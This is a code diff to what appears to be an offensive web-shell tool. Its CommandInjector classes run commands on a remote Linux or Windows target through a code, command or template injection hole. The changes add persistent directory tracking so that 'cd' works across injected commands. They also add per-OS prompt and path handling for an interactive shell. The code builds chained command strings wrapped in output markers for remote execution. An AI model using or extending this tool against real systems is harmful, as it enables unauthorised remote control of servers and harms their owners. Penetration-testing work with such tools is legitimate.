@@ -25,6 +25,7 @@ class CommandInjector:
     OS = None
     COMMAND_DELIMITER = ";"
     PATH_DELIMITER = "/"
+    CURRENT_DIRECTORY_COMMAND = ""
 
     def __init__(
             self,
@@ -43,10 +44,11 @@ class CommandInjector:
 
         self.command_placeholder = command_placeholder
 
-    def execute(self, cmd: str, directory: str = ".", strip: bool = True) -> str:
+        self.cwd = "."
+
+    def execute(self, cmd: str, strip: bool = True) -> str:
         """ Execute the specified command on the target
         :param cmd: the command to execute
-        :param directory: the remote directory where to execute the command
         :param strip: whether the output has to be stripped
         :return: the output of the command from the target
         :raise :class:`requests.exceptions.RequestException` in case of connection errors
@@ -67,7 +69,7 @@ class CommandInjector:
         placeholder = hashlib.md5(f"wshell-{random.random()}".encode("utf-8")).hexdigest()
         # To make `cd` command works over HTTP shell we need to change to the desired directory
         # before the execution of every command
-        cmd = f"cd {directory}{self.COMMAND_DELIMITER}{cmd}"
+        cmd = f"cd {self.cwd}{self.COMMAND_DELIMITER}{cmd}"
         cmd = f"echo {placeholder}{self.COMMAND_DELIMITER}{cmd}{self.COMMAND_DELIMITER}echo {placeholder}"
 
         # We don't know where the command placeholder is, so just try to resolve it anywhere
@@ -136,13 +138,18 @@ class CommandInjector:
         """ Return True if the remote target is detected as Windows """
         return self.is_windows_cmd() or self.is_windows_psh()
 
-    def change_directory(self, directory: str = ".") -> str:
+    def change_directory(self, directory: str) -> str:
         """ Try to change directory and print the actual directory we are jumped in """
-        raise NotImplementedError
+        if directory.startswith("."):
+            # To make `cd .` and `cd ..` works we need to prepend the current directory
+            directory = f"{self.cwd}{self.PATH_DELIMITER}{directory}"
+
+        self.cwd = self.execute(f"cd {directory}{self.COMMAND_DELIMITER}{self.CURRENT_DIRECTORY_COMMAND}")
+        return self.cwd
 
     def current_directory(self):
         """ Return the current working directory """
-        return self.change_directory()
+        return self.change_directory(".")
 
     def get_prompt(self):
         """ Get the specific prompt string for the target OS """
@@ -152,13 +159,17 @@ class CommandInjector:
 class LinuxCommandInjector(CommandInjector):
     """ Linux HTTP Client with RCE capabilities via {code,command,template} injection """
     OS = OSEnum.LINUX
-
-    def change_directory(self, directory: str = ".") -> str:
-        return self.execute(cmd="pwd", directory=directory)
+    CURRENT_DIRECTORY_COMMAND = "pwd"
 
     def get_prompt(self):
-        # Outputs like "www-data@target:/var/www/html$"
-        return self.execute('echo -n "$(whoami)@$(hostname):$(pwd)\\$"')
+        # Outputs like "www-data@target:/var/www/html$ "
+        return self.execute('echo -n "$(whoami)@$(hostname):$(pwd)\\$ "', strip=False)
+
+    def change_directory(self, directory: str) -> str:
+        # Make `cd` with no arguments works
+        if not directory.strip():
+            self.cwd = "."
+        return super().change_directory(directory)
 
 
 class WindowsCmdCommandInjector(CommandInjector):
@@ -166,10 +177,7 @@ class WindowsCmdCommandInjector(CommandInjector):
     OS = OSEnum.WIN_CMD
     COMMAND_DELIMITER = "&&"
     PATH_DELIMITER = "\\"
-
-    def change_directory(self, directory: str = ".") -> str:
-        # If used with no arguments `cd` prints the current directory
-        return self.execute(cmd="cd", directory=directory)
+    CURRENT_DIRECTORY_COMMAND = "cd"
 
     def get_prompt(self):
         # Outputs like "C:\Users\wshell>"
@@ -180,19 +188,17 @@ class WindowsPshCommandInjector(CommandInjector):
     """ Windows (with Powershell) HTTP Client with RCE capabilities via {code,command,template} injection """
     OS = OSEnum.WIN_PSH
     PATH_DELIMITER = "\\"
-
-    def change_directory(self, directory: str = ".") -> str:
-        # On Powershell `Get-Location` returns a multiline string like:
-        #
-        #   PS C:\Users\> Get-Location
-        #
-        #   Path
-        #   ----
-        #   C:\Users\
-        #
-        # If used in a string concatenation we get the path only
-        #
-        return self.execute(cmd="'' + (Get-Location)", directory=directory)
+    # On Powershell `Get-Location` returns a multiline string like:
+    #
+    #   PS C:\Users\> Get-Location
+    #
+    #   Path
+    #   ----
+    #   C:\Users\
+    #
+    # If used in a string concatenation we get the path only
+    #
+    CURRENT_DIRECTORY_COMMAND = "'' + (Get-Location)"
 
     def get_prompt(self):
         # Outputs like "PS C:\Users\wshell>"
